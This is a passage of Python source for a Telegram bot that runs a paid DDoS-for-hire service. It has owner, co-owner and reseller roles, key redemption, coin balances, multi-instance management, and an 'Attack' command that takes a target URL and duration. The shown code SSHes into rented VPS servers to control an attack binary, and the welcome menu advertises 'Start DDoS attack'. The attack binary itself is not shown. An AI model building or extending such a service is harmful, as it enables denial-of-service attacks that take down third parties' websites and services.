    """Checks if the bot is allowed in the current group."""
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS

def is_owner(update: Update):
    """Checks if the user is the bot owner."""
    return update.effective_user.id == OWNER_ID

def is_co_owner(update: Update):
    """Checks if the user is a co-owner."""
    return update.effective_user.id in COOWNER_IDS

def is_reseller(update: Update):
    """Checks if the user is a reseller."""
    return update.effective_user.id in resellers

def is_authorized_user(update: Update):
    """Checks if the user is authorized (owner, co-owner, or reseller)."""
    return is_owner(update) or is_co_owner(update) or is_reseller(update)

def get_random_start_image():
    """Returns a random image from the START_IMAGES list."""
    if not START_IMAGES:
        return {'url': '', 'caption': 'Welcome to the bot!'} # Fallback
    return random.choice(START_IMAGES)

async def reset_vps(update: Update, context: CallbackContext):
    """Reset all busy VPS to make them available again."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can reset VPS!*", parse_mode='Markdown')
        return

    global running_attacks

    busy_count = len(running_attacks)

    if busy_count == 0:
        await update.message.reply_text("ℹ️ *No VPS are currently busy.*", parse_mode='Markdown')
        return

    # Stop any ongoing attacks cleanly before clearing
    for attack_id, attack_info in list(running_attacks.items()):
        target = attack_info['target']
        duration = attack_info['duration']
        attack_user_id = attack_info['user_id']
        vps_info_list = attack_info['vps_info']

        for vps_ip, vps_user, vps_pass in vps_info_list:
            try:
                stop_command = f"pkill -f '{BINARY_NAME} {target}'"
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=vps_ip, username=vps_user, password=vps_pass, timeout=10)
                stdin, stdout, stderr = client.exec_command(stop_command)
                stdout.read()
                stderr.read()
                client.close()
                logging.info(f"Stopped attack on {vps_ip} for {target}")
            except Exception as e:
                logging.error(f"Failed to stop attack on {vps_ip}: {e}")
        del running_attacks[attack_id] # Remove from tracking after attempting to stop

    await update.message.reply_text(
        f"✅ *Reset {busy_count} busy VPS - they are now available for new attacks!*",
        parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
    )

async def add_bot_instance(update: Update, context: CallbackContext):
    """Prompt for adding a new bot instance."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ *Enter the new bot token:*\n\n"
        "Format: `1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ`",
        parse_mode='MarkdownV2'
    )
    return GET_BOT_TOKEN

async def set_new_group_name(update: Update, context: CallbackContext):
    """Set the new official group name and update image captions."""
    global OFFICIAL_GROUP_NAME
    new_name = update.message.text.strip()

    if not new_name:
        await update.message.reply_text("❌ Group name cannot be empty.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    old_name = OFFICIAL_GROUP_NAME
    # Update captions in START_IMAGES
    for image in START_IMAGES:
        if 'caption' in image and old_name:
            image['caption'] = image['caption'].replace(old_name, new_name)

    # Update captions in GROUP_IMAGES
    for group_id, image_info in GROUP_IMAGES.items():
        if 'caption' in image_info and old_name:
            image_info['caption'] = image_info['caption'].replace(old_name, new_name)

    OFFICIAL_GROUP_NAME = new_name
    save_image_config() # Save the updated captions

    await update.message.reply_text(
        f"✅ Official group name changed to: *{new_name}*\n"
        "All image captions have been updated.",
        parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
    )
    return ConversationHandler.END

async def show_users(update: Update, context: CallbackContext):
    """Displays information about the owner, co-owners, and resellers."""
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can check users!*", parse_mode='Markdown')
        return

    try:
        # Owner Info
        owner_info = f"👑 *Owner:* {escape_markdown(OWNER_USERNAME, version=2)} (ID: `{OWNER_ID}`)"
        try:
            owner_chat = await context.bot.get_chat(OWNER_ID)
            owner_info = f"👑 *Owner:* {escape_markdown(owner_chat.full_name, version=2)} (@{escape_markdown(owner_chat.username, version=2) if owner_chat.username else 'N/A'}) (ID: `{OWNER_ID}`)"
        except Exception as e:
            logging.warning(f"Could not fetch owner chat info: {e}")

        # Co-Owners Info
        co_owners_info_list = []
        if COOWNER_IDS:
            for co_owner_id in COOWNER_IDS:
                try:
                    co_owner_chat = await context.bot.get_chat(co_owner_id)
                    co_owners_info_list.append(
                        f"🔹 Co-Owner: {escape_markdown(co_owner_chat.full_name, version=2)} (@{escape_markdown(co_owner_chat.username, version=2) if co_owner_chat.username else 'N/A'}) (ID: `{co_owner_id}`)"
                    )
                except Exception as e:
                    logging.warning(f"Could not fetch co-owner chat info for {co_owner_id}: {e}")
                    co_owners_info_list.append(f"🔹 Co-Owner: ID `{co_owner_id}` (Could not fetch details)")
        else:
            co_owners_info_list.append("_No co-owners_")

        # Resellers Info
        resellers_info_list = []
        if resellers:
            for reseller_id in resellers:
                try:
                    reseller_chat = await context.bot.get_chat(reseller_id)
                    balance = reseller_balances.get(str(reseller_id), 0)
                    resellers_info_list.append(
                        f"🔸 Reseller: {escape_markdown(reseller_chat.full_name, version=2)} (@{escape_markdown(reseller_chat.username, version=2) if reseller_chat.username else 'N/A'}) - Balance: `{balance}` coins (ID: `{reseller_id}`)"
                    )
                except Exception as e:
                    logging.warning(f"Could not fetch reseller chat info for {reseller_id}: {e}")
                    resellers_info_list.append(f"🔸 Reseller: ID `{reseller_id}` (Could not fetch details) - Balance: `{reseller_balances.get(str(reseller_id), 0)}` coins")
        else:
            resellers_info_list.append("_No resellers_")

        message_parts = [
            "📊 *User Information*",
            "",
            owner_info,
            "",
            "*Co-Owners:*",
            *co_owners_info_list,
            "",
            "*Resellers:*",
            *resellers_info_list
        ]
        message = "\n".join(message_parts)

        # Telegram message length limit is 4096 characters
        if len(message) > 4000:
            parts = [message[i:i+4000] for i in range(0, len(message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='MarkdownV2')
        else:
            await update.message.reply_text(message, parse_mode='MarkdownV2')
    except Exception as e:
        logging.error(f"Error in show_users: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "❌ *An error occurred while fetching user information.*",
            parse_mode='Markdown'
        )

async def change_image_link(update: Update, context: CallbackContext):
    """Command to change the image link for /start command (affecting all default images)."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can change image links!", parse_mode='Markdown')
        return ConversationHandler.END

    if not START_IMAGES:
        await update.message.reply_text(
            "ℹ️ No default images are currently configured. Please add some first.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    current_image_urls = "\n".join([f"• `{img['url']}`" for img in START_IMAGES])

    await update.message.reply_text(
        f"🖼️ *Change Start Images*\n\n"
        f"Current default image URLs for /start command:\n{current_image_urls}\n\n"
        "To replace *all* current images, send new URLs, one per line.\n"
        "To add new images while keeping existing ones, send `add` followed by new URLs, one per line.\n"
        "To clear all default images, send `clear`.\n"
        "To update a specific image, reply to its message with the new URL.",
        parse_mode='Markdown'
    )
    return GET_NEW_IMAGE_URL

def create_welcome_message(owner_name, is_owner=False, is_coowner=False, is_reseller=False):
    """Create welcome message with group-style buttons for everyone."""
    if is_owner:
        role = "👑 *Owner*"
        role_emoji = "👑"
        markup = owner_markup
    elif is_coowner:
        role = "🔧 *Co-Owner*"
        role_emoji = "🔧"
        markup = co_owner_markup
    elif is_reseller:
        role = "💰 *Reseller*"
        role_emoji = "💰"
        markup = reseller_markup
    else:
        role = "👤 *User*"
        role_emoji = "👤"
        markup = group_user_markup

    current_time = datetime.now().strftime("%I:%M %p") # e.g., 01:39 AM
    time_emoji = "🌞" if 6 <= datetime.now().hour < 18 else "🌙"
    uptime = get_uptime()
    uptime_emoji = "⏳"

    banner = r"""
╔════════════════════════════════════╗
║                                    ║
║ 🚀 *WELCOME TO THE BOT* 🚀         ║
║                                    ║
╚════════════════════════════════════╝
"""
    welcome_msg = (
        f"{banner}\n\n"
        f"{role_emoji} Your Role: {role}\n"
        f"🤖 Bot Owner: {escape_markdown(owner_name, version=2)}\n"
        f"{time_emoji} Current Time: {current_time}\n"
        f"{uptime_emoji} Bot Uptime: {uptime}\n\n"
        f"✨ Available Commands:\n"
        f"• /start - Show this message\n"
        f"• Attack - Start DDoS attack\n"
        f"• Redeem Key - Activate your access\n"
        f"• Status - Check your key status\n"
        f"• Uptime - Check bot's uptime\n\n"
        f"Use the buttons below to get started!"
    )
    return welcome_msg, markup

async def set_new_image_url(update: Update, context: CallbackContext):
    """Handles updating the list of /start command images."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can change images!", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    text = update.message.text.strip()
    global START_IMAGES

    if text.lower() == "clear":
        START_IMAGES = []
        await update.message.reply_text(
            "✅ All default /start images have been cleared.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    elif text.lower().startswith("add "):
        new_urls_raw = text[4:].strip()
        new_urls = [url.strip() for url in new_urls_raw.split('\n') if url.strip()]
        if not new_urls:
            await update.message.reply_text("❌ No new URLs provided after 'add'.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

        added_count = 0
        for url in new_urls:
            if url.startswith('http://') or url.startswith('https://'):
                START_IMAGES.append({'url': url, 'caption': START_IMAGES[0]['caption'] if START_IMAGES else ""})
                added_count += 1
            else:
                await update.message.reply_text(f"❌ Invalid URL skipped: `{url}` (must start with http:// or https://)", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        await update.message.reply_text(
            f"✅ Added {added_count} new image(s).\n"
            "Captions for new images might need manual adjustment if not specified.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    else: # Assume replace all existing images
        new_urls = [url.strip() for url in text.split('\n') if url.strip()]
        if not new_urls:
            await update.message.reply_text("❌ No new URLs provided to replace images.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

        temp_start_images = []
        replaced_count = 0
        for url in new_urls:
            if url.startswith('http://') or url.startswith('https://'):
                temp_start_images.append({'url': url, 'caption': START_IMAGES[0]['caption'] if START_IMAGES else ""})
                replaced_count += 1
            else:
                await update.message.reply_text(f"❌ Invalid URL skipped: `{url}` (must start with http:// or https://)", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))

        if replaced_count > 0:
            START_IMAGES = temp_start_images
            await update.message.reply_text(
                f"✅ Replaced all default /start images with {replaced_count} new image(s).\n"
                "Captions might need manual adjustment.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
        else:
            await update.message.reply_text("❌ No valid URLs provided for replacement.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

    save_image_config()
    return ConversationHandler.END


async def change_group_name(update: Update, context: CallbackContext):
    """Prompt for changing the official group name."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can change the group name!", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    await update.message.reply_text(
        f"⚠️ Current official group name: `{OFFICIAL_GROUP_NAME}`\n"
        "Enter the new official group name (e.g., `@YourNewGroup`):",
        parse_mode='Markdown'
    )
    return GET_NEW_GROUP_NAME

async def add_bot_token(update: Update, context: CallbackContext):
    """Receives the bot token for a new instance."""
    token = update.message.text.strip()

    if not re.match(r'^\d+:[a-zA-Z0-9_-]+$', token):
        await update.message.reply_text("❌ Invalid bot token format! Please re-enter.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return GET_BOT_TOKEN # Stay in this state to re-prompt
    context.user_data['new_bot_token'] = token
    await update.message.reply_text(
        "⚠️ Enter the owner username for this bot (without @):",
        parse_mode='Markdown'
    )
    return GET_OWNER_USERNAME

async def add_owner_username(update: Update, context: CallbackContext):
    """Receives owner username and attempts to start new bot instance."""
    try:
        owner_username = update.message.text.strip().replace('@', '')
        token = context.user_data['new_bot_token']
        if not owner_username:
            await update.message.reply_text("❌ Invalid username!", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

        configs = load_bot_configs()
        if not isinstance(configs, list):
            logging.error("Invalid bot configs format, resetting to empty list")
            configs = []

        if any(c['token'] == token for c in configs):
            await update.message.reply_text("❌ This bot token is already configured!", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

        # Create a unique directory for this bot's data
        bot_instance_id = len(configs) # Simple ID for now
        bot_data_dir_path = Path(BOT_DATA_DIR) / f"bot_{bot_instance_id}"
        try:
            bot_data_dir_path.mkdir(parents=True, exist_ok=True)
            logging.info(f"Created bot data directory: {bot_data_dir_path}")
        except Exception as e:
            error_msg = f"❌ Failed to create bot directory: {str(e)}"
            logging.error(error_msg)
            await update.message.reply_text(error_msg, parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

        try:
            # Start the new bot as a separate process
            process = subprocess.Popen(
                [sys.executable, str(Path(__file__).resolve()), "--token", token, "--owner", owner_username, "--data_dir", str(bot_data_dir_path)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(bot_data_dir_path), # Set working directory to bot's data dir
                text=True # Capture as text
            )
            BOT_INSTANCES[token] = {
                'process': process,
                'owner_username': owner_username,
                'status': 'Running',
                'start_time': time.time(),
                'data_dir': str(bot_data_dir_path)
            }
            configs.append({'token': token, 'owner_username': owner_username, 'data_dir': str(bot_data_dir_path)})
            save_bot_configs(configs)

            await update.message.reply_text(
                "✅ New bot instance added and started successfully!",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
        except Exception as e:
            error_msg = f"❌ Failed to start new bot instance: {str(e)}"
            logging.error(error_msg, exc_info=True)
            await update.message.reply_text(error_msg, parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except Exception as e:
        logging.error(f"Error in add_owner_username: {str(e)}", exc_info=True)
        await update.message.reply_text("⚠️ An unexpected error occurred.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END


async def show_bot_list_cmd(update: Update, context: CallbackContext):
    """Shows a list of active and configured bots."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can view bot list!", parse_mode='Markdown')
        return

    message_parts = ["🤖 *Bot Instances:*"]
    configs = load_bot_configs()

    if not configs and not BOT_INSTANCES:
        message_parts.append("\n_No bots configured or running._")
    else:
        for i, config in enumerate(configs):
            token = config['token']
            owner_username = config.get('owner_username', 'N/A')
            status = BOT_INSTANCES.get(token, {}).get('status', 'Stopped/Unknown')
            uptime_str = "N/A"
            if status == 'Running':
                start_time = BOT_INSTANCES[token].get('start_time')
                if start_time:
                    uptime_seconds = int(time.time() - start_time)
                    days, remainder = divmod(uptime_seconds, 86400)
                    hours, remainder = divmod(remainder, 3600)
                    minutes, seconds = divmod(remainder, 60)
                    uptime_str = f"{days}d {hours}h {minutes}m {seconds}s"

            message_parts.append(
                f"\n*{i+1}.*\n"
                f"  Token: `{token[:5]}...`\n"
                f"  Owner: @{owner_username}\n"
                f"  Status: *{status}*\n"
                f"  Uptime: {uptime_str}"
            )

    await update.message.reply_text(
        "\n".join(message_parts),
        parse_mode='Markdown'
    )

async def remove_bot_instance_prompt(update: Update, context: CallbackContext):
    """Prompts the user to select a bot instance to remove."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can remove bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured to remove.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    keyboard_buttons = []
    for i, config in enumerate(configs):
        keyboard_buttons.append([f"Remove Bot {i+1} ({config['token'][:5]}...)"])

    reply_markup = ReplyKeyboardMarkup(keyboard_buttons + [['Cancel']], one_time_keyboard=True)
    await update.message.reply_text(
        "⚠️ Select the bot instance to remove:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_STOP # Reusing this state for selection confirmation

async def remove_bot_instance(update: Update, context: CallbackContext):
    """Removes the selected bot instance."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can remove bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    text = update.message.text
    if text == "Cancel":
        await update.message.reply_text("❌ Bot removal cancelled.", reply_markup=owner_markup, parse_mode='Markdown')
        return ConversationHandler.END

    try:
        index_str = text.split('(')[0].replace('Remove Bot ', '').strip()
        index = int(index_str) - 1
        configs = load_bot_configs()

        if 0 <= index < len(configs):
            config_to_remove = configs.pop(index)
            token_to_remove = config_to_remove['token']
            data_dir_to_remove = config_to_remove.get('data_dir')

            # Stop the bot if running
            if token_to_remove in BOT_INSTANCES:
                process = BOT_INSTANCES[token_to_remove]['process']
                if process.poll() is None:  # Check if still running
                    process.terminate()
                    await asyncio.sleep(1) # Give it a moment to terminate
                    if process.poll() is None: # Force kill if still alive
                        process.kill()
                    logging.info(f"Terminated bot process for token: {token_to_remove}")
                del BOT_INSTANCES[token_to_remove]

            # Remove its data directory
            if data_dir_to_remove and os.path.exists(data_dir_to_remove):
                try:
                    shutil.rmtree(data_dir_to_remove)
                    logging.info(f"Removed bot data directory: {data_dir_to_remove}")
                except Exception as e:
                    logging.error(f"Error removing bot data directory {data_dir_to_remove}: {e}")

            save_bot_configs(configs)
            await update.message.reply_text(
                f"✅ Bot instance `{token_to_remove[:5]}...` removed successfully!",
                parse_mode='Markdown',
                reply_markup=owner_markup
            )
        else:
            await update.message.reply_text("❌ Invalid bot selection.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except Exception as e:
        logging.error(f"Error removing bot instance: {str(e)}", exc_info=True)
        await update.message.reply_text("❌ Failed to remove bot instance.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END

async def start_bot_instance_prompt(update: Update, context: CallbackContext):
    """Prompts the user to select a bot instance to start."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can start bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured to start.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    keyboard_buttons = []
    for i, config in enumerate(configs):
        status = BOT_INSTANCES.get(config['token'], {}).get('status', 'Stopped')
        keyboard_buttons.append([f"Start Bot {i+1} ({config['token'][:5]}... Status: {status})"])

    reply_markup = ReplyKeyboardMarkup(keyboard_buttons + [['Cancel']], one_time_keyboard=True)
    await update.message.reply_text(
        "⚠️ Select the bot instance to start:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_START

async def start_bot_instance(update: Update, context: CallbackContext):
    """Starts the selected bot instance."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can start bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    text = update.message.text
    if text == "Cancel":
        await update.message.reply_text("❌ Bot start cancelled.", reply_markup=owner_markup, parse_mode='Markdown')
        return ConversationHandler.END

    try:
        index_str = text.split('(')[0].replace('Start Bot ', '').strip()
        index = int(index_str) - 1
        configs = load_bot_configs()

        if 0 <= index < len(configs):
            config_to_start = configs[index]
            token = config_to_start['token']
            owner_username = config_to_start['owner_username']
            data_dir = config_to_start.get('data_dir', os.path.join(BOT_DATA_DIR, f"bot_{index}"))

            if token in BOT_INSTANCES and BOT_INSTANCES[token]['process'].poll() is None:
                await update.message.reply_text(
                    f"ℹ️ Bot `{token[:5]}...` is already running!",
                    parse_mode='Markdown',
                    reply_markup=owner_markup
                )
                return ConversationHandler.END

            # Ensure data directory exists
            os.makedirs(data_dir, exist_ok=True)

            process = subprocess.Popen(
                [sys.executable, str(Path(__file__).resolve()), "--token", token, "--owner", owner_username, "--data_dir", data_dir],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=data_dir, # Set working directory to bot's data dir
                text=True
            )
            BOT_INSTANCES[token] = {
                'process': process,
                'owner_username': owner_username,
                'status': 'Running',
                'start_time': time.time(),
                'data_dir': data_dir
            }
            await update.message.reply_text(
                f"✅ Bot instance `{token[:5]}...` started successfully!",
                parse_mode='Markdown',
                reply_markup=owner_markup
            )
            logging.info(f"Started bot instance with token: {token}")
        else:
            await update.message.reply_text("❌ Invalid bot selection.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except Exception as e:
        logging.error(f"Error starting bot instance: {str(e)}", exc_info=True)
        await update.message.reply_text("❌ Failed to start bot instance.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END

async def stop_bot_instance_prompt(update: Update, context: CallbackContext):
    """Prompts the user to select a bot instance to stop."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can stop bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    running_tokens = [token for token, info in BOT_INSTANCES.items() if info['process'].poll() is None]
    if not running_tokens:
        await update.message.reply_text("ℹ️ No bot instances are currently running.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    keyboard_buttons = []
    for i, token in enumerate(running_tokens):
        owner_username = BOT_INSTANCES[token]['owner_username']
        keyboard_buttons.append([f"Stop Bot {i+1} ({token[:5]}... Owner: @{owner_username})"])

    reply_markup = ReplyKeyboardMarkup(keyboard_buttons + [['Cancel']], one_time_keyboard=True)
    await update.message.reply_text(
        "⚠️ Select the bot instance to stop:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_STOP

async def stop_bot_instance(update: Update, context: CallbackContext):
    """Stops the selected bot instance."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can stop bot instances!", parse_mode='Markdown')
        return ConversationHandler.END

    text = update.message.text
    if text == "Cancel":
        await update.message.reply_text("❌ Bot stop cancelled.", reply_markup=owner_markup, parse_mode='Markdown')
        return ConversationHandler.END

    try:
        index_str = text.split('(')[0].replace('Stop Bot ', '').strip()
        index = int(index_str) - 1
        running_tokens = [token for token, info in BOT_INSTANCES.items() if info['process'].poll() is None]

        if 0 <= index < len(running_tokens):
            token_to_stop = running_tokens[index]
            process = BOT_INSTANCES[token_to_stop]['process']
            if process.poll() is None: # Still running
                process.terminate()
                await asyncio.sleep(1) # Give it a moment to terminate
                if process.poll() is None: # Force kill if still alive
                    process.kill()
                BOT_INSTANCES[token_to_stop]['status'] = 'Stopped'
                await update.message.reply_text(
                    f"✅ Bot instance `{token_to_stop[:5]}...` stopped successfully!",
                    parse_mode='Markdown',
                    reply_markup=owner_markup
                )
                logging.info(f"Stopped bot instance with token: {token_to_stop}")
            else:
                await update.message.reply_text(
                    f"ℹ️ Bot `{token_to_stop[:5]}...` is already stopped.",
                    parse_mode='Markdown',
                    reply_markup=owner_markup
                )
        else:
            await update.message.reply_text("❌ Invalid bot selection.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except Exception as e:
        logging.error(f"Error stopping bot instance: {str(e)}", exc_info=True)
        await update.message.reply_text("❌ Failed to stop bot instance.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END

async def start(update: Update, context: CallbackContext):
    """Handles the /start command."""
    user_id = update.effective_user.id
    is_o = is_owner(update)
    is_co = is_co_owner(update)
    is_res = is_reseller(update)

    if update.effective_chat.type == 'private':
        owner_name = get_display_name() # Use default display name for private chat
        welcome_message, reply_markup = create_welcome_message(owner_name, is_o, is_co, is_res)
        image_info = get_random_start_image()

        if image_info and image_info['url']:
            caption_text = image_info.get('caption', f"Welcome! This bot is managed by {get_display_name()}.")
            caption_text = caption_text.replace("{owner_display_name}", get_display_name())
            caption_text = caption_text.replace("{official_group_name}", OFFICIAL_GROUP_NAME)
            try:
                await update.message.reply_photo(
                    photo=image_info['url'],
                    caption=caption_text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            except Exception as e:
                logging.error(f"Failed to send photo for /start in private chat: {e}. Sending text instead.")
                await update.message.reply_text(
                    welcome_message,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
        else:
            await update.message.reply_text(
                welcome_message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    else: # Group chat
        if not is_allowed_group(update):
            await update.message.reply_text("❌ This group is not authorized to use the bot.", parse_mode='Markdown')
            return

        group_id = str(update.effective_chat.id)
        image_info = get_group_image(group_id)

        group_title = escape_markdown(update.effective_chat.title, version=2)
        group_display_name = get_display_name(group_id)

        if image_info and image_info['url']:
            caption_text = image_info.get('caption', f"Welcome to *{group_title}*! This bot is managed by {group_display_name}.")
            caption_text = caption_text.replace("{owner_display_name}", group_display_name)
            caption_text = caption_text.replace("{official_group_name}", OFFICIAL_GROUP_NAME)
            try:
                await update.message.reply_photo(
                    photo=image_info['url'],
                    caption=caption_text,
                    parse_mode='Markdown',
                    reply_markup=group_user_markup
                )
            except Exception as e:
                logging.error(f"Failed to send photo for /start in group {group_id}: {e}. Sending text instead.")
                await update.message.reply_text(
                    f"🌟 Welcome to *{group_title}*! I'm ready to help. Use the buttons below.",
                    parse_mode='Markdown',
                    reply_markup=group_user_markup
                )
        else:
            await update.message.reply_text(
                f"🌟 Welcome to *{group_title}*! I'm ready to help. Use the buttons below.",
                parse_mode='Markdown',
                reply_markup=group_user_markup
            )

    if 'users_interacted' not in context.bot_data:
        context.bot_data['users_interacted'] = []
    if user_id not in context.bot_data['users_interacted']:
        context.bot_data['users_interacted'].append(user_id)
        logging.info(f"New user interacted: {user_id}")

def get_appropriate_markup(update: Update):
    """Returns the correct keyboard markup based on user's role."""
    if is_owner(update):
        return owner_markup
    elif is_co_owner(update):
        return co_owner_markup
    elif is_reseller(update):
        return reseller_markup
    else:
        return group_user_markup

async def handle_button_click(update: Update, context: CallbackContext):
    """Handles button clicks and routes to appropriate functions."""
    text = update.message.text
    user_id = update.effective_user.id
    chat_type = update.effective_chat.type

    if text == 'Attack':
        if not bot_open and not is_owner(update) and not is_co_owner(update):
            await update.message.reply_text(
                "❌ Bot is currently closed by the owner.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        if chat_type != 'private' and not is_allowed_group(update):
            await update.message.reply_text("❌ This group is not authorized to use the bot.", parse_mode='Markdown')
            return ConversationHandler.END
        if not (is_owner(update) or user_id in redeemed_users):
            await update.message.reply_text("❌ You need to redeem a key to use attack features.", parse_mode='Markdown')
            return ConversationHandler.END
        await update.message.reply_text(
            "⚠️ Enter the target URL and duration (e.g., `https://example.com 60`):\n\n"
            "Max duration: `600` seconds (regular keys), `240` seconds (special keys)",
            parse_mode='Markdown'
        )
        return GET_ATTACK_ARGS
    elif text == 'Redeem Key':
        await update.message.reply_text("⚠️ Enter your key to redeem:")
        return GET_KEY
    elif text == 'Rules':
        await update.message.reply_text(
            "📜 *Bot Rules:*\n"
            "1. Do not attack government or critical infrastructure websites.\n"
            "2. Do not misuse the bot.\n"
            "3. Respect other users.\n"
            "4. All attacks are logged. Misuse will result in key revocation.\n"
            "5. The bot owner is not responsible for your actions.\n"
            "6. Max 900 threads for general keys, max 2000 for special keys.\n"
            "7. Max 600 seconds duration for general keys, max 240 seconds for special keys.\n"
            "8. Cooldown of 60 seconds between attacks for regular users.",
            parse_mode='Markdown'
        )
    elif text == '🔍 Status':
        await show_status(update, context)
    elif text == '⏳ Uptime':
        await update.message.reply_text(
            f"✅ Bot Uptime: *{get_uptime()}*",
            parse_mode='Markdown'
        )
    elif text == 'Balance':
        await show_balance(update, context)
    elif text == 'Generate Key':
        await generate_key_prompt(update, context)
    elif text == 'Settings':
        await settings_menu(update, context)
    elif text == 'Delete Key':
        await delete_key_prompt(update, context)
    elif text == '🔑 Special Key':
        await generate_special_key_prompt(update, context)
    elif text == 'OpenBot':
        await open_bot(update, context)
    elif text == 'CloseBot':
        await close_bot(update, context)
    elif text == 'Menu':
        await menu_selection(update, context)
    elif text == 'Add Group ID':
        await add_group_id_prompt(update, context)
    elif text == 'Remove Group ID':
        await remove_group_id_prompt(update, context)
    elif text == 'RE Status':
        await show_reseller_status(update, context)
    elif text == 'VPS Status':
        await show_vps_status(update, context)
    elif text == 'Add VPS':
        await add_vps_prompt(update, context)
    elif text == 'Remove VPS':
        await remove_vps_prompt(update, context)
    elif text == 'Add Co-Owner':
        await add_co_owner_prompt(update, context)
    elif text == 'Remove Co-Owner':
        await remove_co_owner_prompt(update, context)
    elif text == 'Set Display Name':
        await set_display_name_prompt(update, context)
    elif text == 'Upload Binary':
        await upload_binary_prompt(update, context)
    elif text == 'Delete Binary':
        await delete_binary_prompt(update, context)
    elif text == 'Back to Home':
        await start(update, context)
        return ConversationHandler.END
    elif text == 'Set Duration':
        await set_duration_prompt(update, context)
    elif text == 'Add Reseller':
        await add_reseller_prompt(update, context)
    elif text == 'Remove Reseller':
        await remove_reseller_prompt(update, context)
    elif text == 'Set Threads':
        await set_threads_prompt(update, context)
    elif text == 'Add Coin':
        await add_coin_prompt(update, context)
    elif text == 'Set Cooldown':
        await set_cooldown_prompt(update, context)
    elif text == 'Reset VPS':
        await reset_vps(update, context)
    elif text == '⚙️ Owner Settings':
        await owner_settings(update, context)
    elif text == '👥 Check Users':
        await show_users(update, context)
    elif text == 'Add Bot':
        await add_bot_instance(update, context)
    elif text == 'Remove Bot':
        await remove_bot_instance_prompt(update, context)
    elif text == 'Bot List':
        await show_bot_list_cmd(update, context)
    elif text == 'Start Selected Bot':
        await start_bot_instance_prompt(update, context)
    elif text == 'Stop Selected Bot':
        await stop_bot_instance_prompt(update, context)
    elif text == 'Promote':
        await promote(update, context)
    elif text == '🔗 Manage Links':
        await manage_links(update, context)
    elif text == '📢 Broadcast':
        await broadcast_start(update, context)
    elif text == '🖼️ Set Group Image':
        await set_group_image_prompt(update, context)
    elif text == '🔗 Set Group Link':
        await set_group_link_prompt(update, context)
    elif text == 'Change Image':
        await change_image_link(update, context)
    elif text == 'Change Group Name':
        await change_group_name(update, context)
    else:
